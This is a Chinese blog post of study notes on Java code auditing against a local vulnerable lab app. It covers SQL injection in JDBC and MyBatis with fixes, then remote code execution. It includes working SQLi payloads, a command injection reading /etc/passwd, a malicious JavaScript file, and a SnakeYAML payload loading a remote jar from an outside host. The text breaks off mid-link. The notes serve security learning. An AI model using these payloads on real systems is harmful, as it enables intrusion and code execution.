{"title":"Java代码审计学习","uid":"241d6a7bc9b104c51a615919491c3ad9","slug":"Java代码审计学习","date":"2022-12-09T10:29:21.000Z","updated":"2022-12-09T11:01:00.652Z","comments":true,"path":"api/articles/Java代码审计学习.json","keywords":null,"cover":[],"content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<h1 id=\"环境搭建：\"><a href=\"#环境搭建：\" class=\"headerlink\" title=\"环境搭建：\"></a>环境搭建：</h1><p>视频教程地址：<a href=\"https://www.bilibili.com/video/BV11t4y1n7KU/?share_source=copy_web&amp;vd_source=8ca6ac59b747f3cadc0c59cff919b9e5\">https://www.bilibili.com/video/BV11t4y1n7KU/?share_source=copy_web&amp;vd_source=8ca6ac59b747f3cadc0c59cff919b9e5</a></p>\n<p>文档地址：<a href=\"https://www.freebuf.com/articles/web/338008.html\">https://www.freebuf.com/articles/web/338008.html</a></p>\n<p>Javasec地址：<a href=\"https://javasec.org/\">https://javasec.org/</a></p>\n<p>IDEA导入项目，遇到激活服务器重新激活，在日常问题处理里面有记录解决方法</p>\n<p>修改了maven的setting位置改成了d盘</p>\n<p>自动加载相关类库</p>\n<p>直接运行，访问192.168.0.107:8080即可看到登录页面</p>\n<p>admin  admin123</p>\n<h1 id=\"SQL注入：\"><a href=\"#SQL注入：\" class=\"headerlink\" title=\"SQL注入：\"></a>SQL注入：</h1><h2 id=\"JDBC：\"><a href=\"#JDBC：\" class=\"headerlink\" title=\"JDBC：\"></a>JDBC：</h2><h3 id=\"漏洞代码：\"><a href=\"#漏洞代码：\" class=\"headerlink\" title=\"漏洞代码：\"></a>漏洞代码：</h3><p>这种链接方式只有老版本的cms才会使用了</p>\n<p><a href=\"http://192.168.0.107:8080/sqli/jdbc/vuln?username=joychou\">http://192.168.0.107:8080/sqli/jdbc/vuln?username=joychou</a></p>\n<p>漏洞代码：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">&#x2F;**\n     * Vuln Code.\n     * http:&#x2F;&#x2F;localhost:8080&#x2F;sqli&#x2F;jdbc&#x2F;vuln?username&#x3D;joychou\n     *\n     * @param username username\n     *&#x2F;\n    &#x2F;&#x2F;@RequestMapping(&quot;&#x2F;jdbc&#x2F;vuln&quot;)\n    @GetMapping(&quot;&#x2F;jdbc&#x2F;vuln&quot;)\n    &#x2F;&#x2F;public String jdbc_sqli_vul(@RequestParam(&quot;username&quot;) String username) &#123;\n        public String jdbc_sqli_vul( String username) &#123;\n\n        StringBuilder result &#x3D; new StringBuilder();\n\n        try &#123;\n            Class.forName(driver);\n            Connection con &#x3D; DriverManager.getConnection(url, user, password);\n\n            if (!con.isClosed())\n                System.out.println(&quot;Connect to database successfully.&quot;);\n\n            &#x2F;&#x2F; sqli vuln code\n            Statement statement &#x3D; con.createStatement();\n            String sql &#x3D; &quot;select * from users where username &#x3D; &#39;&quot; + username + &quot;&#39;&quot;;\n            logger.info(sql);\n            ResultSet rs &#x3D; statement.executeQuery(sql);\n\n            while (rs.next()) &#123;\n                String res_name &#x3D; rs.getString(&quot;username&quot;);\n                String res_pwd &#x3D; rs.getString(&quot;password&quot;);\n                String info &#x3D; String.format(&quot;%s: %s\\n&quot;, res_name, res_pwd);\n                result.append(info);\n                logger.info(info);\n            &#125;\n            rs.close();\n            con.close();\n\n\n        &#125; catch (ClassNotFoundException e) &#123;\n            logger.error(&quot;Sorry,can&#96;t find the Driver!&quot;);\n        &#125; catch (SQLException e) &#123;\n            logger.error(e.toString());\n        &#125;\n        return result.toString();\n    &#125;</code></pre>\n\n<p>sql语句直接拼接，只需要闭合前面的单引号就能注入，但是没有输出错误信息。所以直接使用时间盲注payload，其实也可以使用布尔盲注。习惯时间盲注了。</p>\n<p>[<a href=\"http://localhost:8080/sqli/jdbc/vuln?username=joychou%27and%20if(length(database())%3E1,sleep(3),0)%23%5D\">http://localhost:8080/sqli/jdbc/vuln?username=joychou%27and%20if(length(database())%3E1,sleep(3),0)%23]</a>(<a href=\"http://localhost:8080/sqli/jdbc/vuln?username=joychou&#39;and\">http://localhost:8080/sqli/jdbc/vuln?username=joychou&#39;and</a> if(length(database())&gt;1,sleep(3),0)%23)</p>\n<p>页面成功延时3秒钟</p>\n<p>在sql语句下断点，调试发现直接将语句拼接导致注入</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/63.PNG\"></p>\n<h3 id=\"修复代码：\"><a href=\"#修复代码：\" class=\"headerlink\" title=\"修复代码：\"></a>修复代码：</h3><p>Java的sql注入防御一般使用预编译</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">&#x2F;**\n   * Security Code.\n   * http:&#x2F;&#x2F;localhost:8080&#x2F;sqli&#x2F;jdbc&#x2F;sec?username&#x3D;joychou\n   *\n   * @param username username\n   *&#x2F;\n\n  &#x2F;&#x2F;    http:&#x2F;&#x2F;localhost:8080&#x2F;sqli&#x2F;jdbc&#x2F;sec?username&#x3D;xx\n  &#x2F;&#x2F;http:&#x2F;&#x2F;localhost:8080&#x2F;controller&#x2F;&#x2F;sqli&#x2F;jdbc&#x2F;sec?username&#x3D;xx\n  @RequestMapping(&quot;&#x2F;jdbc&#x2F;sec&quot;)\n  public String jdbc_sqli_sec(@RequestParam(&quot;username&quot;) String username) &#123;\n\n      StringBuilder result &#x3D; new StringBuilder();\n      try &#123;\n          Class.forName(driver);\n          Connection con &#x3D; DriverManager.getConnection(url, user, password);\n\n          if (!con.isClosed())\n              System.out.println(&quot;Connecting to Database successfully.&quot;);\n\n          &#x2F;&#x2F; fix code\n          String sql &#x3D; &quot;select * from users where username &#x3D; ?&quot;;\n          PreparedStatement st &#x3D; con.prepareStatement(sql);\n          st.setString(1, username);\n\n          logger.info(st.toString());  &#x2F;&#x2F; sql after prepare statement\n          ResultSet rs &#x3D; st.executeQuery();\n\n          while (rs.next()) &#123;\n              String res_name &#x3D; rs.getString(&quot;username&quot;);\n              String res_pwd &#x3D; rs.getString(&quot;password&quot;);\n              String info &#x3D; String.format(&quot;%s: %s\\n&quot;, res_name, res_pwd);\n              result.append(info);\n              logger.info(info);\n          &#125;\n\n          rs.close();\n          con.close();\n\n      &#125; catch (ClassNotFoundException e) &#123;\n          logger.error(&quot;Sorry, can&#96;t find the Driver!&quot;);\n          e.printStackTrace();\n      &#125; catch (SQLException e) &#123;\n          logger.error(e.toString());\n      &#125;\n      return result.toString();\n  &#125;\n</code></pre>\n\n<p>就是使用？占位符，在使用预编译，Java预编译会将占位符的参数字符串的内容进行转义</p>\n<p>再次使用刚刚的延时注入payload：[<a href=\"http://localhost:8080/sqli/jdbc/sec?username=joychou%27and%20if(length(database())%3E1,sleep(3),0)%23%5D\">http://localhost:8080/sqli/jdbc/sec?username=joychou%27and%20if(length(database())%3E1,sleep(3),0)%23]</a>(<a href=\"http://localhost:8080/sqli/jdbc/sec?username=joychou&#39;and\">http://localhost:8080/sqli/jdbc/sec?username=joychou&#39;and</a> if(length(database())&gt;1,sleep(3),0)%23)</p>\n<p>发现页面很快就刷新过来，调试一下，看看Java预编译是如何处理语句的</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/64.png\"></p>\n<p>开源看到我输入的单引号被转义了，这样语句就不能注入了</p>\n<h3 id=\"like预编译问题：\"><a href=\"#like预编译问题：\" class=\"headerlink\" title=\"like预编译问题：\"></a>like预编译问题：</h3><p>Java预编译是很好的解决注入的方法，但是不正确的使用预编译也会造成注入。而且有的sql关键字后面使用预编译需要注意，比如like：</p>\n<p>正常的like注入就不讲了，直接看预编译的like注入</p>\n<h4 id=\"错误写法：\"><a href=\"#错误写法：\" class=\"headerlink\" title=\"错误写法：\"></a>错误写法：</h4><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">String sql &#x3D; &quot;select * from users where username like &#39;% ? %&#39;&quot;;\n            PreparedStatement st &#x3D; con.prepareStatement(sql);\n            st.setString(1, username);</code></pre>\n\n<p>这段预编译语句会直接报错，为什么？因为这个?被包裹在了单引号里面，Java就无法判断占位符。那如果按照下面这样写呢？</p>\n<h4 id=\"正确写法1：\"><a href=\"#正确写法1：\" class=\"headerlink\" title=\"正确写法1：\"></a>正确写法1：</h4><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">String sql &#x3D; &quot;select * from users where username like &#39;%&#39; ? &#39;%&#39;&quot;;\n            PreparedStatement st &#x3D; con.prepareStatement(sql);\n            st.setString(1, username);</code></pre>\n\n<p>这个时候idea没有报错，按照道理这个语句在执行sql的时候会报错，但是我测试发现可以正常执行。调试发现虽然使用了两个单引号包裹% ，但是在语句中只会有一个单引号</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/65.png\"></p>\n<p>并且username正确时，能够得到正确结果。所以，这是一种正确的写法。。。。</p>\n<p>在网上搜索只发现下面这种正确写法：</p>\n<h4 id=\"写法2：\"><a href=\"#写法2：\" class=\"headerlink\" title=\"写法2：\"></a>写法2：</h4><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">String sql &#x3D; &quot;select * from users where username like ?&quot;;\n            PreparedStatement st &#x3D; con.prepareStatement(sql);\n&#x2F;&#x2F;            st.setString(1, username);\n            st.setString(1, &quot;%&quot;+username+&quot;%&quot;);</code></pre>\n\n<p>这种写法就不用多说了</p>\n<h3 id=\"order-by：\"><a href=\"#order-by：\" class=\"headerlink\" title=\"order by：\"></a>order by：</h3><p>还有order by这种，这种是直接不能使用预编译的。在order by的后面要跟字段名，预编译处理时会直接将字段名用单引号包裹。</p>\n<p>所以一般这个地方比较容易出现sql注入</p>\n<p>实列的话，看这个链接：<a href=\"https://blog.csdn.net/lin___/article/details/51731019\">https://blog.csdn.net/lin___/article/details/51731019</a></p>\n<h2 id=\"Mybatis：\"><a href=\"#Mybatis：\" class=\"headerlink\" title=\"Mybatis：\"></a>Mybatis：</h2><p>接下来就是常用的框架了</p>\n<h3 id=\"框架识别：\"><a href=\"#框架识别：\" class=\"headerlink\" title=\"框架识别：\"></a>框架识别：</h3><p>首先是如何判断源码中使用的是Mybatis，直接查看pom.xml。里面会列举出这套源码使用的各种组件和版本</p>\n<pre class=\"line-numbers language-xml\" data-language=\"xml\"><code class=\"language-xml\">&lt;!-- mybatis --&gt;\n&lt;dependency&gt;\n&lt;groupId&gt;org.mybatis.spring.boot&lt;&#x2F;groupId&gt;\n&lt;artifactId&gt;mybatis-spring-boot-starter&lt;&#x2F;artifactId&gt;\n&lt;version&gt;1.3.2&lt;&#x2F;version&gt;\n&lt;&#x2F;dependency&gt;</code></pre>\n\n<p>如果使用了Mybatis，就会写在pom.xml里面。</p>\n<h3 id=\"映射方法：\"><a href=\"#映射方法：\" class=\"headerlink\" title=\"映射方法：\"></a>映射方法：</h3><p>代码中有两种映射方法，一种是通过sql语句标签映射。</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"> @GetMapping(&quot;&#x2F;mybatis&#x2F;vuln01&quot;)\n    public List&lt;User&gt; mybatisVuln01(@RequestParam(&quot;username&quot;) String username) &#123;\n        return userMapper.findByUserNameVuln01(username);\n    &#125;\n\n\n@Select(&quot;select * from users where username &#x3D; &#39;$&#123;username&#125;&#39;&quot;)\n    List&lt;User&gt; findByUserNameVuln01(@Param(&quot;username&quot;) String username);</code></pre>\n\n<p>另一种不使用标签，但是会将sql语句放在一个xml文件里面。这个文件一般放在resources/mapper文件夹里面：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">@GetMapping(&quot;&#x2F;mybatis&#x2F;vuln02&quot;)\n    public List&lt;User&gt; mybatisVuln02(@RequestParam(&quot;username&quot;) String username) &#123;\n        return userMapper.findByUserNameVuln02(username);\n    &#125;</code></pre>\n\n<pre class=\"line-numbers language-xml\" data-language=\"xml\"><code class=\"language-xml\">&lt;!--&lt;select id&#x3D;&quot;findByUserName&quot; resultMap&#x3D;&quot;User&quot;&gt;--&gt;\n &lt;!--select * from users where username &#x3D; #&#123;username&#125;--&gt;\n&lt;!--&lt;&#x2F;select&gt;--&gt;\n\n&lt;select id&#x3D;&quot;findByUserNameVuln02&quot; parameterType&#x3D;&quot;String&quot; resultMap&#x3D;&quot;User&quot;&gt;\n\n    select * from users where username like &#39;%$&#123;_parameter&#125;%&#39;\n&lt;&#x2F;select&gt;\n\n&lt;select id&#x3D;&quot;findByUserNameVsec02&quot; parameterType&#x3D;&quot;String&quot; resultMap&#x3D;&quot;User&quot;&gt;\n    select * from users where username like concat(&#39;%&#39;,#&#123;_parameter&#125;, &#39;%&#39;)\n&lt;&#x2F;select&gt;</code></pre>\n\n<p>这个里面的_parameter是一个万能替换参数，无论前面的代码中给这个参数起个什么名字，都能使用_parameter参数接收。通过id识别使用的是哪条语句。</p>\n<h3 id=\"拼接方法：\"><a href=\"#拼接方法：\" class=\"headerlink\" title=\"拼接方法：\"></a>拼接方法：</h3><p>Mybatis中两种拼接sql语句的方法：</p>\n<ol>\n<li>${xxx}   属于直接拼接，类似于jdbc</li>\n<li>#{xxxxx}  进行预处理后拼接</li>\n</ol>\n<h4 id=\"：\"><a href=\"#：\" class=\"headerlink\" title=\"${}：\"></a>${}：</h4><p>一般的sql漏洞也是出现在第一种拼接方式中，所以审计的时候可以全文查找${</p>\n<p>前面两种映射的拼接方式都是直接拼接，就可能存在漏洞</p>\n<p>看一下第一种拼接的语句最后是什么样子</p>\n<p>好家伙调式鬼才，太麻烦了，直接看看执行的sql语句是什么吧</p>\n<p>访问：[<a href=\"http://localhost:8080/sqli/mybatis/vuln01?username=joychou%27%20or%20%271%27=%271%5D\">http://localhost:8080/sqli/mybatis/vuln01?username=joychou%27%20or%20%271%27=%271]</a>(<a href=\"http://localhost:8080/sqli/mybatis/vuln01?username=joychou&#39;\">http://localhost:8080/sqli/mybatis/vuln01?username=joychou&#39;</a> or ‘1’=’1)</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/66.png\"></p>\n<p>可以看到，直接拼接造成语句变成全匹配，直接返回所有结果</p>\n<p>这种的修复就是直接将${} 替换为#{}</p>\n<h4 id=\"like修复：\"><a href=\"#like修复：\" class=\"headerlink\" title=\"like修复：\"></a>like修复：</h4><p>和前面一样，遇到like的时候需要注意。直接拼接不会出现问题，但是当使用#{}进行修复需要注意</p>\n<p>可以使用concat进行字符串拼接</p>\n<p>Mysql：</p>\n<pre class=\"line-numbers language-xml\" data-language=\"xml\"><code class=\"language-xml\">&lt;select id&#x3D;&quot;findByUserNameVsec02&quot; parameterType&#x3D;&quot;String&quot; resultMap&#x3D;&quot;User&quot;&gt;\n    select * from users where username like concat(&#39;%&#39;,#&#123;_parameter&#125;, &#39;%&#39;)\n&lt;&#x2F;select&gt;</code></pre>\n\n<p>当然基于前面的发现，可以直接这样写</p>\n<pre class=\"line-numbers language-xml\" data-language=\"xml\"><code class=\"language-xml\">&lt;select id&#x3D;&quot;findByUserNameVsec02&quot; parameterType&#x3D;&quot;String&quot; resultMap&#x3D;&quot;User&quot;&gt;\n       select * from users where username like &#39;%&#39;,#&#123;_parameter&#125;, &#39;%&#39;\n   &lt;&#x2F;select&gt;</code></pre>\n\n<p>访问：[<a href=\"http://localhost:8080/sqli/mybatis/vsec02?username=joychou%27%20or%20%271%27=%271%27%20%23%5D\">http://localhost:8080/sqli/mybatis/vsec02?username=joychou%27%20or%20%271%27=%271%27%20%23]</a>(<a href=\"http://localhost:8080/sqli/mybatis/vsec02?username=joychou&#39;\">http://localhost:8080/sqli/mybatis/vsec02?username=joychou&#39;</a> or ‘1’=’1’ %23)</p>\n<p>可以看到返回结果为空，同时查看执行的sql语句为：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">select * from users where username like concat(&#39;%&#39;,&#39;joychou\\&#39; or \\&#39;1\\&#39;&#x3D;\\&#39;1\\&#39; #&#39;, &#39;%&#39;)</code></pre>\n\n<p>已经转义完成。</p>\n<p>Oracle：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">SELECT * FROM user WHERE name like CONCAT(&#39;%&#39;,#&#123;name&#125;,&#39;%&#39;) \n或 \nSELECT * FROM user WHERE name like &#39;%&#39;||#&#123;name&#125;||&#39;%&#39;</code></pre>\n\n<p>Sqlserver：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">SELECT * FROM user WHERE name like &#39;%&#39;+#&#123;name&#125;+&#39;%&#39; </code></pre>\n\n<p>DB2：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">SELECT * FROM user WHERE name like &#39;%&#39;+#&#123;name&#125;+&#39;%&#39; \n或 \nSELECT * FROM user WHERE name like &#39;%&#39;||#&#123;name&#125;||&#39;%&#39;</code></pre>\n\n<h4 id=\"order-by修复：\"><a href=\"#order-by修复：\" class=\"headerlink\" title=\"order by修复：\"></a>order by修复：</h4><p>payload：[<a href=\"http://localhost:8080/sqli/mybatis/orderby/vuln03?sort=1%20and%20updatexml(1,concat(0x7e,(select%20version()),0x7e),1)%5D\">http://localhost:8080/sqli/mybatis/orderby/vuln03?sort=1%20and%20updatexml(1,concat(0x7e,(select%20version()),0x7e),1)]</a>(<a href=\"http://localhost:8080/sqli/mybatis/orderby/vuln03?sort=1\">http://localhost:8080/sqli/mybatis/orderby/vuln03?sort=1</a> and updatexml(1,concat(0x7e,(select version()),0x7e),1))</p>\n<p>直接在whitelabel error page页面爆出数据库版本。</p>\n<p>直接拼接也是一样的${}，看如何修复</p>\n<p>修复就和前面jdbc一样，只能添加过滤，要不然就直接将参数写死。</p>\n<p>过滤方法：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">private static final Pattern FILTER_PATTERN &#x3D; Pattern.compile(&quot;^[a-zA-Z0-9_&#x2F;\\\\.-]+$&quot;);\n\n    &#x2F;**\n     * 过滤mybatis中order by不能用#的情况。\n     * 严格限制用户输入只能包含&lt;code&gt;a-zA-Z0-9_-.&lt;&#x2F;code&gt;字符。\n     *\n     * @param sql sql\n     * @return 安全sql，否则返回null\n     *&#x2F;\n    public static String sqlFilter(String sql) &#123;\n        if (!FILTER_PATTERN.matcher(sql).matches()) &#123;\n            return null;\n        &#125;\n        return sql;\n    &#125;</code></pre>\n\n<h2 id=\"Hibernate：\"><a href=\"#Hibernate：\" class=\"headerlink\" title=\"Hibernate：\"></a>Hibernate：</h2><p>是和Mybatis类似的框架</p>\n<p>这个视频作者没有详解，来个学习链接：<a href=\"https://www.cnblogs.com/hhua-best/p/8051860.html\">https://www.cnblogs.com/hhua-best/p/8051860.html</a></p>\n<p>主要是这个框架配置比较麻烦</p>\n<p>视频作者的原文：</p>\n<p>hibernate即我们经常使用的orm的一种实现，如果使用已封装好的方法，那么默认是使用预编译的。需要注意的有这么几种情况：</p>\n<ol>\n<li>对于一些复杂的sql语句，需要开发手写sql，此时要严格过滤用户输入。</li>\n<li>上面提到的预编译不生效的几种场景。</li>\n</ol>\n<p>hibernate的审计和jdbc类似，查找+，like，order by</p>\n<h1 id=\"吐槽：\"><a href=\"#吐槽：\" class=\"headerlink\" title=\"吐槽：\"></a>吐槽：</h1><p>thinkphp5.1的cms审的太费劲，喜欢全文看，那得看好久。只能功能点测试+功能点代码审计+关键字搜索</p>\n<p>为了不耽误时间，thinkphp框架的先放一放</p>\n<p>先来Java代码审计的学习了</p>\n<p>看视频发现教程作者也是不懂开发的，但是能总结成这样真是不错了。入门完全没问题。。。。</p>\n<p>这个教程适合不是太懂Java的，要想深入学习，有一些大佬也出了一些教程：</p>\n<p>很推荐：</p>\n<p><strong>Java安全学习：</strong><a href=\"https://javasec.org/\"><strong>https://javasec.org/</strong></a></p>\n<p><strong>Java反序列化入门：代码审计星球的系列文章 Java安全漫谈</strong></p>\n<p><strong>Java反序列化利用链调式详情：B站白日梦组长</strong></p>\n<p>学这么久了，该看的也看了，得总结了。后面会把常见的漏洞及利用方式总结，方便自己忘记的时候查找。形成框架，方便复习。后面学到新姿势，就是在框架上添砖加瓦了。</p>\n<p>归类总结才是正途。。。。。。。。</p>\n<h1 id=\"RCE：\"><a href=\"#RCE：\" class=\"headerlink\" title=\"RCE：\"></a>RCE：</h1><p>在Java中，很多反序列化导致执行命令，本地命令执行感觉应该不是很多。并且Java开发常用的命令执行也就那么几个，其他深层次调用都需要通过反射和反序列化配合。</p>\n<p>所以，在Java中审计命令执行就查找相关的几个关键字就行了。</p>\n<h2 id=\"Runtime-exec：\"><a href=\"#Runtime-exec：\" class=\"headerlink\" title=\"Runtime.exec：\"></a>Runtime.exec：</h2><p>最常用的就是这个Runtime.exec了，包括各种里用反序列化执行命令也是使用这个方法</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">@GetMapping(&quot;&#x2F;runtime&#x2F;exec&quot;)\n    public String CommandExec(String cmd) &#123;\n        Runtime run &#x3D; Runtime.getRuntime();\n        StringBuilder sb &#x3D; new StringBuilder();\n\n        try &#123;\n            Process p &#x3D; run.exec(cmd);\n            BufferedInputStream in &#x3D; new BufferedInputStream(p.getInputStream());\n            BufferedReader inBr &#x3D; new BufferedReader(new InputStreamReader(in));\n            String tmpStr;\n\n            while ((tmpStr &#x3D; inBr.readLine()) !&#x3D; null) &#123;\n                sb.append(tmpStr);\n            &#125;\n\n            if (p.waitFor() !&#x3D; 0) &#123;\n                if (p.exitValue() &#x3D;&#x3D; 1)\n                    return &quot;Command exec failed!!&quot;;\n            &#125;\n\n            inBr.close();\n            in.close();\n        &#125; catch (Exception e) &#123;\n            return e.toString();\n        &#125;\n        return sb.toString();\n    &#125;\n</code></pre>\n\n<p>接收cmd参数，直接放到exec方法去执行，没有任何过滤</p>\n<p>访问：<a href=\"http://localhost:8080/rce/runtime/exec?cmd=whoami\">http://localhost:8080/rce/runtime/exec?cmd=whoami</a></p>\n<p>直接执行命令</p>\n<h2 id=\"ProcessBuilder：\"><a href=\"#ProcessBuilder：\" class=\"headerlink\" title=\"ProcessBuilder：\"></a>ProcessBuilder：</h2><p>Runtime.exec是直接执行命令和在命令行使用相同，Processbuilder传入的参数是一个列表，第一个参数是可执行命令的程序，后面的参数是该程序的参数。</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">@GetMapping(&quot;&#x2F;ProcessBuilder&quot;)\n   public String processBuilder(String cmd,String cmd1) &#123;\n\n       StringBuilder sb &#x3D; new StringBuilder();\n\n       try &#123;\n          &#x2F;&#x2F; String[] arrCmd &#x3D; &#123;&quot;&#x2F;bin&#x2F;sh&quot;, &quot;-c&quot;, cmd&#125;;  &#x2F;&#x2F;linux\n           String[] arrCmd &#x3D; &#123;cmd,cmd1&#125;;                 &#x2F;&#x2F;windows,windos下无需指定\n           ProcessBuilder processBuilder &#x3D; new ProcessBuilder(arrCmd);\n           Process p &#x3D; processBuilder.start();\n           BufferedInputStream in &#x3D; new BufferedInputStream(p.getInputStream());\n           BufferedReader inBr &#x3D; new BufferedReader(new InputStreamReader(in));\n           String tmpStr;\n\n           while ((tmpStr &#x3D; inBr.readLine()) !&#x3D; null) &#123;\n               sb.append(tmpStr);\n           &#125;\n       &#125; catch (Exception e) &#123;\n           return e.toString();\n       &#125;\n\n       return sb.toString();\n   &#125;</code></pre>\n\n<p>为了体现区别，就直接接收两个传参。比如执行ping baidu.com，只需要访问：</p>\n<p><a href=\"http://localhost:8080/rce/ProcessBuilder?cmd=ping&amp;cmd1=baidu.com\">http://localhost:8080/rce/ProcessBuilder?cmd=ping&amp;cmd1=baidu.com</a></p>\n<p>若是需要执行whoami，只需将第二个参数设置为空，但访问时必须携带，否则会爆出空指针异常</p>\n<p><a href=\"http://localhost:8080/rce/ProcessBuilder?cmd=whoami&amp;cmd1=\">http://localhost:8080/rce/ProcessBuilder?cmd=whoami&amp;cmd1=</a></p>\n<p>那要是只有一个参数该怎么办呢？开始以为只有一个参数，是不是就可以传入一个列表，或者按照php数组参数。但是测试发现都不可以，毕竟Java是强类型语言，定义的cmd参数是String类型，传入数组或列表肯定会报错的。</p>\n<p>Runtime.exec也是使用ProcessBuilder执行命令。但是肯定是处理了传入的字符串，按照空格变成数组。所以使用ProcessBuilder执行ping之类的命令可能需要一点小技巧。。。</p>\n<p>还有类似的漏洞代码</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">@GetMapping(&quot;&#x2F;codeinject&quot;)\n   public String codeInject(String filepath) throws IOException &#123;\n\n       &#x2F;&#x2F;String[] cmdList &#x3D; new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filepath&#125;;\n       String[] cmdList &#x3D; new String[]&#123;&quot;cmd.exe&quot;, &quot;-c&quot;, &quot;dir &quot; + filepath&#125;;\n       ProcessBuilder builder &#x3D; new ProcessBuilder(cmdList);\n       builder.redirectErrorStream(true);\n       Process process &#x3D; builder.start();\n       return WebUtils.convertStreamToString(process.getInputStream());\n   &#125;</code></pre>\n\n<p>可控某一部分参数，使用命令拼接的方法执行命令</p>\n<p>访问：[<a href=\"http://localhost:8080/codeinject?filepath=/tmp;cat%20/etc/passwd%5D\">http://localhost:8080/codeinject?filepath=/tmp;cat%20/etc/passwd]</a>(<a href=\"http://localhost:8080/codeinject?filepath=/tmp;cat\">http://localhost:8080/codeinject?filepath=/tmp;cat</a> /etc/passwd)</p>\n<p>查看/etc/passwd文件</p>\n<h2 id=\"ScriptEngine：\"><a href=\"#ScriptEngine：\" class=\"headerlink\" title=\"ScriptEngine：\"></a>ScriptEngine：</h2><p>使用脚本引擎执行脚本代码，引擎脚本为js，通过获取远程js文件，并执行js文件中的js代码。要是该js文件可控，那么就可以利用它执行恶意js脚本。</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">@GetMapping(&quot;&#x2F;jscmd&quot;)\n    public void jsEngine(String jsurl) throws Exception&#123;\n        &#x2F;&#x2F; js nashorn javascript ecmascript\n        ScriptEngine engine &#x3D; new ScriptEngineManager().getEngineByName(&quot;js&quot;);\n        Bindings bindings &#x3D; engine.getBindings(ScriptContext.ENGINE_SCOPE);&#x2F;&#x2F;启动javascript引擎\n        String cmd &#x3D; String.format(&quot;load(\\&quot;%s\\&quot;)&quot;, jsurl);\n        engine.eval(cmd, bindings);\n    &#125;</code></pre>\n\n<p>rce.js</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\">var a &#x3D; mainOutput(); \nfunction mainOutput() &#123; \n  var x&#x3D;java.lang.Runtime.getRuntime().exec(&quot;calc&quot;);\n&#125;</code></pre>\n\n<p>在服务器上打开python http.server  ，之后远程访问该js文件</p>\n<p><a href=\"http://localhost:8080/rce/jscmd?jsurl=http://xxxx/rce.js\">http://localhost:8080/rce/jscmd?jsurl=http://xxxx/rce.js</a></p>\n<p>即可执行命令，弹出计算器，linux修改命令就行</p>\n<h2 id=\"snakeyaml：\"><a href=\"#snakeyaml：\" class=\"headerlink\" title=\"snakeyaml：\"></a>snakeyaml：</h2><p>利用snakeyaml存在反序列化漏洞，就是可以通过其远程加载恶意jar文件，达到命令执行的效果。</p>\n<p>snakeyaml   maven依赖</p>\n<pre class=\"line-numbers language-xml\" data-language=\"xml\"><code class=\"language-xml\">&lt;dependency&gt;\n  &lt;groupId&gt;org.yaml&lt;&#x2F;groupId&gt;\n  &lt;artifactId&gt;snakeyaml&lt;&#x2F;artifactId&gt;\n  &lt;version&gt;1.27&lt;&#x2F;version&gt;\n&lt;&#x2F;dependency&gt;</code></pre>\n\n<p>这个恶意类必须实现了javax.script.ScriptEngineFactory接口</p>\n<p>payload：<a href=\"https://github.com/artsploit/yaml-payload/blob/master/src/artsploit/AwesomeScriptEngineFactory.java\">https://github.com/artsploit/yaml-payload/blob/master/src/artsploit/AwesomeScriptEngineFactory.java</a></p>\n<p>先将该java文件编译，在生成jar文件</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">javac src&#x2F;artsploit&#x2F;AwesomeScriptEngineFactory.java\n\njar -cvf yaml-payload.jar -C src&#x2F; .</code></pre>\n\n<p>之后和前面一样，放到服务器上，开启python http服务。</p>\n<p>通过url访问</p>\n<p>漏洞代码：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">@GetMapping(&quot;&#x2F;vuln&#x2F;yarm&quot;)\n    public void yarm(String content) &#123;\n        Yaml y &#x3D; new Yaml();\n        y.load(content);\n    &#125;</code></pre>\n\n<p>payload：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">!!javax.script.ScriptEngineManager [\n  !!java.net.URLClassLoader [[\n    !!java.net.URL [&quot;http:&#x2F;&#x2F;artsploit.com&#x2F;yaml-payload.jar&quot;]\n  ]]\n]</code></pre>\n\n<p>访问：[<a href=\"http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20%5B!!java.net.URLClassLoader%20%5B%5B!!java.net.URL%20%5B%22http://xxxx/yaml-payload.jar%22%5C%5D%5D%5D%5D%5D\">http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://xxxx/yaml-payload.jar%22\\]]]]]</a>(<a href=\"http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager\">http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager</a> [!!java.net.URLClassLoader [[!!java.net.URL [“<a 